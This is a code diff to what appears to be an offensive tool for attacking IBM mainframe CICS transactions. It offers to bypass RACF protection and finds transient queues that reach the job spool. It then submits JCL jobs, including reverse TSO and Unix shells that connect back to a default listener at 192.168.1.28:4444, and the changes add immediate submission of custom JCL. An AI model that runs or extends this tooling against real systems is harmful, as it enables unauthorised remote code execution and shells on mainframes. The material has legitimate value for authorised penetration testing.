@@ -610,7 +610,7 @@ def get_infos():
         whine("CECI is not available. Little information will be available on the system", 'err')
         
     if is_ceda and (not is_ceci or not is_cemt):
-        whine("CECI and CEMT are not available. Little information will be available on the system", 'err')
+        whine("CECI or CEMT are not available. Little information will be available on the system", 'err')
         response = raw_input(bcolors.YELLOW+'[!] Try to bypass RACF protection ? Y/N [Y]: '+bcolors.ENDC)
         
         if response.upper() != "N":
@@ -668,7 +668,7 @@ def get_infos():
         tdqueue = query_cics_scrap(CEMT+' INQUIRE TDQueue DDN (INREADER)', 'Tdq(', 4, 0, 0)
         tdqueue2 = query_cics_scrap(CEMT+' INQUIRE TDQueue DDN (INTRDR)', 'Tdq(', 4, 0, 0)
     
-    print tdqueue
+    
     if (tdqueue or tdqueue2 ) and (tdqueue !="*" or tdqueue2 !="*") and is_ceci:
         whine('Transiant queue to access spool is apparently available','good',1)
         whine('When submitting a job with TDQueue, provide the option --queue='+(tdqueue.strip('\n') if tdqueue else tdqueue2.strip('\n')),'good',2)
@@ -1552,6 +1552,7 @@ def submit_job(kind,lhost="192.168.1.28:4444"):
     """
     if kind =="ftp" or kind =="custom":
        set_mixedCase()
+       em.send_pf3()    
     
     method = None
     token = open_spool()
@@ -1570,6 +1571,9 @@ def submit_job(kind,lhost="192.168.1.28:4444"):
     if results.jcl and kind=="custom":
        f = open(results.jcl,"r")
        lines = f.readlines()
+       if lines[len(lines)-1] !="/*EOF":
+          whine("/*EOF added to the JCL to start the JOB immediatly",'info')
+          lines.append("/*EOF")
        jcl = ''.join(lines)
     
     elif kind=="dummy":
@@ -1585,10 +1589,10 @@ def submit_job(kind,lhost="192.168.1.28:4444"):
         jcl = direct_jcl(results.port,kind="unix")
     elif kind=="ftp":
         jcl = ftp_jcl(lhost)
-    else:
-        whine('Submit parameter must be one of the following: direct_unix, direct_tso, reverse_tso, reverse_unix, ftp, dummy','err')
-        sys.exit()
     
+    else:
+        whine('Submit parameter must be one of the following: direct_unix, direct_tso, reverse_tso, reverse_unix, ftp, custom, dummy','err')
+        sys.exit()
     # Writting JCL        
     if method=="spool":
         spool_write(token, jcl)
@@ -1927,6 +1931,13 @@ if __name__ == "__main__" :
     
     results = parser.parse_args()
     
+    if results.submit=="custom" and not results.jcl:
+       whine('use -j option to input path of JCL to submit','err');
+       sys.exit();
+    if results.submit=="custom" and not os.path.isfile(results.jcl) :
+       whine('Cannot access file '+results.jcl,'err');
+       sys.exit();
+       
     if (results.submit and (results.lhost == None or len(results.lhost.split(":")) < 2) and not results.jcl and (results.submit.find("direct")< 0)):
         whine('You must specify a connect back address with the option --lhost <LHOST:PORT> ','err')
         sys.exit()      
